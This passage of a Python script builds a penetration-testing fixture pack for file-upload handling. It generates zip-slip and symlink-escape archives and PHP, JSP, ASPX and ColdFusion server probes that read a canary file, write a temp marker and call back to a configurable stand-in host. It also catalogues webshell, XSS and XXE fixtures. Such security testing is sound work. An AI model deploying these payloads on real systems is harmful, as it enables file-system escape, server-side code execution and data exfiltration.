        for name, entry in [('zip-slip-absolute-unix.zip', '/tmp/pentest-upload-marker.txt'),
                            ('zip-slip-windows.zip', '..\\pentest-upload-marker.txt')]:
            self.emit('zip', name, zip_bytes({entry:b'pentest\n'}), 'archive-path-traversal', stage='extract', processor='Archive extractor with unsafe path joining',
                      requires='Target OS and path separator rules match; extractor does not confine paths.', evidence='Marker written outside a disposable extraction directory.',
                      refs=('zip',), destructive=True, notes='May overwrite an existing marker. The absolute UNIX marker is fixed at /tmp/pentest-upload-marker.txt; use only on a disposable test host.')
        out = io.BytesIO()
        with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
            link = zipfile.ZipInfo('pentest-link', (2026,1,1,0,0,0)); link.create_system=3; link.external_attr=(stat.S_IFLNK|0o777)<<16
            z.writestr(link, '..')
            marker = zipfile.ZipInfo('pentest-link/pentest-upload-marker.txt', (2026,1,1,0,0,0))
            marker.compress_type = zipfile.ZIP_DEFLATED
            marker.external_attr = 0o100644 << 16
            z.writestr(marker, b'pentest\n')
        self.emit('zip', 'symlink-escape.zip', out.getvalue(), 'archive-symlink-escape', stage='extract', processor='Extractor restoring and following symbolic links',
                  requires='Extractor restores symlinks and follows them for later entries without resolved-path confinement.', evidence='Marker appears in the disposable parent of the extraction root.', refs=('symlink',), destructive=True,
                  notes='Some libraries extract links as ordinary files or reject them. That is not a successful escape.')
        inner = zip_bytes({'pentest.php': b'<?php echo "pentest"; ?>\n'})
        self.emit('zip', 'nested-archive.zip', zip_bytes({'pentest.zip':inner}), 'recursive-disallowed-file', stage='recursive-inspection', processor='Recursive archive scanner',
                  evidence='Scanner finds PHP inside the second ZIP layer, or a documented depth policy blocks inspection.', limits={'archive_layers':2,'terminal_files':1}, proof='policy-probe')
        out = io.BytesIO()
        with warnings.catch_warnings():
            warnings.simplefilter('ignore', UserWarning)
            with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
                for data in [b'pentest\n', b'<?php echo "pentest"; ?>\n']:
                    zi=zipfile.ZipInfo('pentest.php',(2026,1,1,0,0,0));zi.compress_type=zipfile.ZIP_DEFLATED;z.writestr(zi,data)
        self.emit('zip', 'duplicate-entry.zip', out.getvalue(), 'archive-duplicate-entry', stage='scan/extract', processor='Scanner/extractor with different duplicate-entry policies',
                  requires='The two consumers choose different duplicate entries and allow prohibited content through.', evidence='Record which entry each consumer inspects/extracts; compare content hashes. Difference alone is not code execution.',
                  validity='valid-with-duplicate-entry-names', proof='parser-policy-probe', notes='First pentest.php is plain text; second contains only a PHP pentest marker. Never extract into a web-served executable directory for inspection.')
        content = b'pentest\n' * 16384
        self.emit('zip', 'expansion-bounded.zip', zip_bytes({'pentest.txt':content}), 'bounded-archive-expansion', stage='inspect/extract', processor='Archive expanded-size limiter',
                  evidence='Expanded-size policy handling at 128 KiB; this is not a ZIP bomb or service-outage demonstration.', limits={'expanded_bytes':len(content),'entries':1}, proof='limit-probe', risk='low')
        self.emit('zip', 'file-count-bounded.zip', zip_bytes({f'pentest-{i:02}.txt':b'pentest\n' for i in range(32)}), 'bounded-archive-entry-count',
                  stage='inspect/extract', processor='Archive entry-count limiter', evidence='Entry-count policy handling at 32 files.', limits={'entries':32,'expanded_bytes':256}, proof='limit-probe', risk='low')

    def build_server_probes(self):
        path = self.config['canary_path']
        literal = json.dumps(path, ensure_ascii=True)
        php_path = "'" + path.replace('\\', '\\\\').replace("'", "\\'") + "'"
        for ext in ('php','phtml','jsp','aspx','cfm'):
            url = self.url(ext + '-http')
            qurl = json.dumps(url)
            if ext in ('php','phtml'):
                read = f'<?php header("Content-Type: text/plain"); $v=@file_get_contents({php_path},false,null,0,4096); echo $v===false ? "pentest: canary unavailable" : $v; ?>\n'
                write = '<?php header("Content-Type: text/plain"); $p=sys_get_temp_dir().DIRECTORY_SEPARATOR."pentest-upload-marker.txt"; $f=@fopen($p,"x"); if($f===false){echo "pentest: marker exists or write denied";}else{fwrite($f,"pentest\\n");fclose($f);echo "pentest";} ?>\n'
                php_url = "'" + url.replace("'", "\\'") + "'"
                http = f'<?php $c=stream_context_create(["http"=>["timeout"=>3,"method"=>"GET","follow_location"=>0]]);$f=@fopen({php_url},"r",false,$c);if($f!==false){{fclose($f);echo "pentest";}}else{{echo "pentest: callback failed";}} ?>\n'
            elif ext == 'jsp':
                read = f'<%@ page import="java.nio.file.*" %><% response.setContentType("text/plain");try{{out.print(new String(Files.readAllBytes(Paths.get({literal})),"UTF-8"));}}catch(Exception e){{out.print("pentest: canary unavailable");}} %>\n'
                write = '<%@ page import="java.nio.file.*" %><% response.setContentType("text/plain");try{Files.write(Paths.get(System.getProperty("java.io.tmpdir"),"pentest-upload-marker.txt"),"pentest\\n".getBytes("UTF-8"),StandardOpenOption.CREATE_NEW,StandardOpenOption.WRITE);out.print("pentest");}catch(Exception e){out.print("pentest: marker exists or write denied");} %>\n'
                http = f'<%@ page import="java.net.*,java.io.*" %><% try{{HttpURLConnection c=(HttpURLConnection)new URL({qurl}).openConnection();c.setInstanceFollowRedirects(false);c.setConnectTimeout(3000);c.setReadTimeout(3000);try(InputStream s=c.getInputStream()){{s.read();}}out.print("pentest");}}catch(Exception e){{out.print("pentest: callback failed");}} %>\n'
            elif ext == 'aspx':
                read = f'<%@ Page Language="C#" %><%@ Import Namespace="System.IO" %><% Response.ContentType="text/plain";try{{Response.Write(File.ReadAllText({literal}));}}catch(Exception){{Response.Write("pentest: canary unavailable");}} %>\n'
                write = '<%@ Page Language="C#" %><%@ Import Namespace="System.IO" %><% Response.ContentType="text/plain";try{using(var f=new FileStream(Path.Combine(Path.GetTempPath(),"pentest-upload-marker.txt"),FileMode.CreateNew,FileAccess.Write)){var b=System.Text.Encoding.UTF8.GetBytes("pentest\\n");f.Write(b,0,b.Length);}Response.Write("pentest");}catch(Exception){Response.Write("pentest: marker exists or write denied");} %>\n'
                http = f'<%@ Page Language="C#" %><%@ Import Namespace="System.Net" %><% try{{var r=(HttpWebRequest)WebRequest.Create({qurl});r.AllowAutoRedirect=false;r.Timeout=3000;r.ReadWriteTimeout=3000;using(var s=r.GetResponse()){{Response.Write("pentest");}}}}catch(Exception){{Response.Write("pentest: callback failed");}} %>\n'
            else:
                cpath=path.replace('"','""').replace('#','##')
                read=f'<cfcontent type="text/plain"><cftry><cfoutput>#fileRead("{cpath}","utf-8")#</cfoutput><cfcatch><cfoutput>pentest: canary unavailable</cfoutput></cfcatch></cftry>\n'
                # ColdFusion's Java File.createNewFile reserves the marker atomically.
                write='<cfcontent type="text/plain"><cftry><cfset f=createObject("java","java.io.File").init(getTempDirectory(),"pentest-upload-marker.txt")><cfif f.createNewFile()><cfset fileWrite(f.getPath(),"pentest" & chr(10),"utf-8")><cfoutput>pentest</cfoutput><cfelse><cfoutput>pentest: marker exists or write denied</cfoutput></cfif><cfcatch><cfoutput>pentest: marker exists or write denied</cfoutput></cfcatch></cftry>\n'
                curl=url.replace('"','""').replace('#','##')
                http=f'<cftry><cfhttp url="{curl}" method="get" timeout="3" redirect="false" result="probe"><cfoutput>pentest: #encodeForHTML(probe.statusCode)#</cfoutput><cfcatch><cfoutput>pentest: callback failed</cfoutput></cfcatch></cftry>\n'
            for name, data, kind, callback, canary in [('read-canary',read,'server-canary-read',None,True),('write-canary',write,'server-canary-write',None,False),('http-callback',http,'server-http-callback',url,False)]:
                self.emit(ext, name+'.'+ext, data, kind, stage='server-execute', processor=f'Compatible {ext.upper()} server handler',
                          requires='Upload location is executable by the corresponding server handler. Process permissions/network policy permit the fixed operation.',
                          evidence='Configured canary content, exclusively created temp marker, or correlated fixed-URL HTTP request, depending on the fixture.',
                          callback=callback, canary=canary, notes='No request-controlled path, URL or command. Write target is the OS temp directory/pentest-upload-marker.txt. CFM uses Java createNewFile then writes the owned marker; no hostile concurrent writer is assumed.',
                          limits={'http_timeout_seconds':3} if callback else {})

    def enrich_originals(self):
        defaults = {
            'webshell-command-execution': ('server-execute', 'Compatible server-side handler', 'A cmd parameter is passed to an OS execution API. The file itself has no authentication.', 'Server process', 'none'),
            'server-side-code-execution': ('server-execute', 'PHP handler consuming the entire file', 'Final extension alone does not execute PHP. Image/PDF bytes precede a trailing PHP echo marker.', 'Server process', 'none'),
            'stored-xss': ('serve/open', 'Browser active document context', 'Response origin, MIME, CSP and embedding context permit scripts. SVG in img context normally disables scripts.', 'Viewer', 'open document'),
            'metadata-injection': ('metadata-preview', 'Metadata extractor and HTML sink', 'Extracted metadata is reflected into HTML without correct escaping.', 'Viewer', 'view metadata'),
            'prototype-pollution-input': ('merge', 'Unsafe JavaScript recursive merge', 'JSON.parse alone does not pollute prototypes.', 'Server or client application', 'none'),
            'pdf-javascript': ('open', 'PDF viewer supporting document-level JavaScript', 'Viewer supports and enables PDF JavaScript; this is not browser-origin XSS or OS code execution.', 'Viewer', 'open PDF'),
            'path-traversal-filename': ('store', 'Upload filename/path handling', 'Use the suggested upload filename in multipart metadata; the TXT contents are identical to the valid fixture.', 'Server filesystem', 'none'),
            'xxe-local-file-read': ('parse', 'Unsafe XML parser', 'External entities must be enabled and /etc/hostname must exist; prefer the configurable canary probe for a controlled test.', 'Parser host', 'none'),
            'nested-disallowed-file': ('inspect/extract', 'Archive scanner/extractor', 'Archive inspection fails to enforce the nested file policy; PHP execution additionally requires an executable deployment path.', 'Server', 'none'),
            'zip-slip': ('extract', 'Extractor without path confinement', 'Entry ../pentest-upload-test.txt escapes the extraction directory and can overwrite a same-named marker.', 'Server filesystem', 'none'),
        }
        for rel, e in self.cases.items():
            if e['category'] != 'malicious' or rel in self.generated:
                continue
            stage, processor, note, actor, interaction = defaults.get(e['payload_type'], ('application-specific','Application-specific processor','Feature dependent.','processor host','none'))
            e.update(processing_stage=stage,target_processor=processor,version_scope='Processor/version/configuration dependent.',prerequisites=note,
                     trigger=stage,expected_evidence=e['expected_impact'],affected_actor=actor,user_interaction=interaction,callback_url=None,canary_uri=None,
                     limits={},proof_strength='capability-probe',verification_status='Static contents inspected; target runtime behavior not certified.',references=[SOURCES['upload']],notes=note,build_origin='original fixture')
            if e['payload_type'] in ('zip-slip','path-traversal-filename'):
                e['destructive']=True
            if e['payload_type']=='server-side-code-execution':
                e['expected_evidence']='An added PHP pentest output after the original file bytes, only when a PHP handler evaluates the file. Seeing the ordinary image/PDF marker is not success.'
                e['expected_impact']=e['expected_evidence']

    def finish(self):
        self.enrich_originals()
        actual = {p.relative_to(self.root).as_posix():p for category in ('valid','abnormal','malicious') for p in self.root.glob('*/'+category+'/*') if p.is_file() and not p.name.startswith('.')}
        unknown=set(actual)-set(self.cases)
        if unknown: raise ValueError('Unregistered fixtures: '+repr(sorted(unknown)))
        missing=set(self.cases)-set(actual)
        if missing: raise ValueError('Missing registered fixtures: '+repr(sorted(missing)))
        for rel,p in actual.items():
            d=p.read_bytes(); self.cases[rel]['size_bytes']=len(d);self.cases[rel]['sha256']=hashlib.sha256(d).hexdigest()
        self.manifest.update(schema_version=2,marker='pentest',configuration=self.config,cases=[self.cases[p] for p in sorted(actual)])
        (self.root/'manifest.json').write_text(json.dumps(self.manifest,ensure_ascii=False,indent=2)+'\n')
        fields=['path','extension','category','actual_format','structural_validity','payload_type','risk_level','destructive','visible_marker','expected_impact','suggested_upload_filename','size_bytes','sha256']
        fields += sorted({k for e in self.manifest['cases'] for k in e} - set(fields))
        with (self.root/'manifest.csv').open('w',newline='') as f:
            w=csv.DictWriter(f,fieldnames=fields,lineterminator='\n');w.writeheader()
            for e in self.manifest['cases']:
                w.writerow({k:json.dumps(v,ensure_ascii=False) if isinstance(v,(dict,list)) else v for k,v in e.items()})
        print(json.dumps({'fixtures':len(actual),'malicious':sum(e['category']=='malicious' for e in self.cases.values()),'generated_or_updated':len(self.generated),'callback_base':self.config['callback_base']},indent=2))


def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--root',type=Path,default=ROOT,help='Existing pack root (valid fixtures and manifest are required).')
    parser.add_argument('--callback-base',default=None,help='HTTP(S) endpoint base controlled by the tester; path suffixes identify each probe.')
    parser.add_argument('--canary-path',default=None,help='Absolute path as seen by server-side scripts and INCLUDETEXT.')
    parser.add_argument('--canary-uri',default=None,help='Absolute file: URI as seen by XML/PDF/HTML processors.')
    args=parser.parse_args();root=args.root.resolve()
    existing=json.loads((root/'manifest.json').read_text()).get('configuration',{})
    config={'callback_base':args.callback_base or existing.get('callback_base','https://callback.example.invalid/pentest'),
            'canary_path':args.canary_path or existing.get('canary_path','/tmp/pentest-canary.txt'),
            'canary_uri':args.canary_uri or existing.get('canary_uri','file:///tmp/pentest-canary.txt')}
    u=urlparse(config['callback_base'])
    if u.scheme not in ('http','https') or not u.hostname or u.username or u.password or u.query or u.fragment:
        parser.error('--callback-base must be an HTTP(S) URL without credentials, query or fragment.')
    if re.search(r'[\s<>"\'\\]',config['callback_base']): parser.error('Use a URL-encoded callback base without whitespace, quotes or backslashes.')
    uri=urlparse(config['canary_uri'])
    if re.search(r'[\s<>"\'\\]',config['canary_uri']) or uri.scheme!='file' or uri.netloc not in ('','localhost') or not uri.path.startswith('/') or uri.query or uri.fragment:
        parser.error('--canary-uri must be an absolute local file: URI without query/fragment.')
    if any(ord(c)<32 for c in config['canary_path']) or not (config['canary_path'].startswith('/') or re.match(r'^[A-Za-z]:[\\/]',config['canary_path'])):
        parser.error('--canary-path must be an absolute UNIX or Windows path without control characters.')
    if bool(args.canary_path) != bool(args.canary_uri):
        parser.error('Pass --canary-uri together with --canary-path so all probes refer to the same target-side canary.')
    # Reject invalid CLI inputs before writing any files. Building makes no network requests.
    try:
        import PIL, pypdf
    except ImportError as error:
        parser.error(str(error)+'; install requirements.txt into an environment outside the pack root.')
    builder=Builder(root,config)
    builder.build_xml_svg();builder.build_html_text_json();builder.build_csv();builder.build_office()
    builder.build_pdf();builder.build_images();builder.build_archives();builder.build_server_probes();builder.finish()


if __name__=='__main__':
    main()
